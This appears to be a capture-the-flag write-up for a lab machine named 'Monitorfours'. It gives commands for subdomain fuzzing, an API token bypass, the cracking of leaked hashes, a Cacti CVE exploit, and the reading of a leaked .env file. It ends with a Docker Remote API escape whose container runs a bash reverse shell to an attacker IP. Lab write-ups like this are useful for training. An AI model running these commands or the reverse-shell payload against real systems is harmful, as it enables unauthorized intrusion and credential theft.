# Monitorfours: Machine Notes

## Recon

### Nmap
- Port 80/tcp: HTTP (monitorsfour.htb)
- Port 2375/tcp: Docker Remote API (Unsecured)
- Port 5985/tcp: WinRM

### Web Enumeration
- Subdomain discovery:
```bash
ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3
```
- Discovered `cacti.monitorsfour.htb`.

## Initial Access

### API Exploitation (Token Bypass)
- Testing the `/api/v1/users` endpoint for authentication flaws.
- Found that `token=0` (potentially type juggling or logic error) bypasses the check:
```bash
curl -i "http://monitorsfour.htb/api/v1/users?token=0"
```
- Leaked user credentials:
  - `admin` : `56b32eb43e6f15395f6c46c1c9e1cd36` (MD5)
- Crack MD5 hash: `wonderful1`.

### Cacti Exploitation
- Users found in API dump reuse passwords on Cacti: `marcus` : `wonderful1`.
- Exploit Cacti (v1.2.28) using CVE-2025-24367.
```bash
# PoC: https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
python3 exploit.py -u marcus -p wonderful1 -t http://cacti.monitorsfour.htb
```

## Privilege Escalation / Post-Exploitation

### Environment Info Leak
- Discovered `.env` file containing database credentials:
```bash
curl -s http://monitorsfour.htb/.env
```
- DB_USER: `monitorsdbuser`
- DB_PASS: `f37p2j8f4t0r`

### Docker Escape (Remote API)
- The Docker daemon is exposed on port 2375 without authentication.
- List images:
```bash
curl http://[IP]:2375/images/json
```
- Create a privileged container mounting the host filesystem to escape:
```bash
echo '{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/[KALI_IP]/60002 0>&1"],
  "HostConfig": {
    "Binds": ["/:/host_root"],
    "Privileged": true
  }
}' > create_container.json

curl -X POST -H "Content-Type: application/json" -d @create_container.json http://[IP]:2375/containers/create
curl -X POST http://[IP]:2375/containers/[ID]/start
```
- This provides a shell with access to the host's root filesystem.
